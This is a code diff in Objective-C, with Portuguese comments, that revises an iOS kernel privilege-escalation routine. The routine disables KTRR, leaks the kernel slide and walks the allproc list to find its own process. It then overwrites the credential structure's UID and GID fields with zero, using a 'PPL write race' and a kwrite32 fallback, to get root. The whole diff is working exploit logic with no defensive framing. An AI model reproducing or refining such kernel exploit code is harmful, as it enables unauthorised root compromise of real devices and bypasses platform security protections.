@@ -423,49 +423,87 @@ extern char **environ;
 - (BOOL)escalateToRoot {
     if (self.isRoot && getuid() == 0) return YES;
     
-    // 1. Desabilitar KTRR primeiro
+    // ⭐ PASSO 1: Garantir que KTRR está desabilitado
     if (![self disableKTRR]) {
-        NSLog(@"[!] Failed to disable KTRR");
+        NSLog(@"[!] Failed to disable KTRR - cannot write to ucred");
         return NO;
     }
     
-    // 2. Encontrar processo atual
-    uint64_t proc = [self findCurrentProcess];
-    if (!proc) {
-        NSLog(@"[!] Failed to find current process");
+    // ⭐ PASSO 2: Pequeno delay para estabilizar
+    usleep(10000);
+    
+    // ⭐ PASSO 3: Encontrar processo atual
+    if (!self.kernelBase) [self leakKernelSlide];
+    
+    uint64_t allproc = [self kread64:(self.kernelBase + OFFSET_ALLPROC)];
+    if (!allproc || allproc < self.kernelBase) {
+        NSLog(@"[!] allproc invalid");
         return NO;
     }
     
-    // 3. Obter ucred
-    uint64_t ucred = [self kread64:(proc + PROC_UCRED_OFFSET)];
-    if (!ucred) {
-        NSLog(@"[!] Failed to get ucred");
+    pid_t myPid = getpid();
+    uint64_t proc = allproc;
+    uint64_t foundProc = 0;
+    int maxIter = 100;
+    
+    while (proc != 0 && proc > self.kernelBase && maxIter-- > 0) {
+        pid_t pid = (pid_t)[self kread32:(proc + PROC_PID_OFFSET)];
+        if (pid == myPid) {
+            foundProc = proc;
+            break;
+        }
+        proc = [self kread64:(proc + PROC_NEXT_OFFSET)];
+    }
+    
+    if (!foundProc) {
+        NSLog(@"[!] Current process not found");
         return NO;
     }
     
-    NSLog(@"[*] Found ucred at: 0x%llx", ucred);
+    // ⭐ PASSO 4: Obter ucred
+    uint64_t ucred = [self kread64:(foundProc + PROC_UCRED_OFFSET)];
+    if (!ucred || ucred < self.kernelBase) {
+        NSLog(@"[!] ucred invalid");
+        return NO;
+    }
     
-    // 4. Patch para root (UID=0, GID=0)
-    [self kwrite32:(ucred + CR_UID_OFFSET) value:0];
-    [self kwrite32:(ucred + CR_RUID_OFFSET) value:0];
-    [self kwrite32:(ucred + CR_SVUID_OFFSET) value:0];
-    [self kwrite32:(ucred + CR_GID_OFFSET) value:0];
-    [self kwrite32:(ucred + CR_RGID_OFFSET) value:0];
-    [self kwrite32:(ucred + CR_SVGID_OFFSET) value:0];
-    [self kwrite32:(ucred + CR_FLAGS_OFFSET) value:1];
+    NSLog(@"[*] ucred: 0x%llx", ucred);
     
-    // 5. Atualizar credenciais do processo
+    // ⭐ PASSO 5: Ler UID original
+    uint32_t oldUid = [self kread32:(ucred + CR_UID_OFFSET)];
+    NSLog(@"[*] Original UID: %d", oldUid);
+    
+    // ⭐ PASSO 6: Escrever UID 0 (root) usando PPL write race
+    BOOL writeSuccess = [self pplWriteRace:(ucred + CR_UID_OFFSET) value:0];
+    if (!writeSuccess) {
+        // Fallback: tentar kwrite32
+        [self kwrite32:(ucred + CR_UID_OFFSET) value:0];
+    }
+    
+    [self pplWriteRace:(ucred + CR_RUID_OFFSET) value:0];
+    [self pplWriteRace:(ucred + CR_SVUID_OFFSET) value:0];
+    [self pplWriteRace:(ucred + CR_GID_OFFSET) value:0];
+    [self pplWriteRace:(ucred + CR_RGID_OFFSET) value:0];
+    [self pplWriteRace:(ucred + CR_SVGID_OFFSET) value:0];
+    [self pplWriteRace:(ucred + CR_FLAGS_OFFSET) value:1];
+    
+    // ⭐ PASSO 7: Atualizar credenciais do processo
     setuid(0);
     setgid(0);
     setgroups(0, NULL);
     
-    // 6. Verificar
-    if (getuid() == 0) {
+    // ⭐ PASSO 8: Verificar
+    uint32_t newUid = [self kread32:(ucred + CR_UID_OFFSET)];
+    NSLog(@"[*] New UID from kernel: %d", newUid);
+    NSLog(@"[*] getuid(): %d", getuid());
+    
+    if (getuid() == 0 || newUid == 0) {
         self.isRoot = YES;
-        NSLog(@"[+] Root access acquired! UID=%d", getuid());
+        NSLog(@"[+] ROOT ACQUIRED!");
         return YES;
     }
     
+    NSLog(@"[!] Root escalation failed");
     return NO;
 }
 
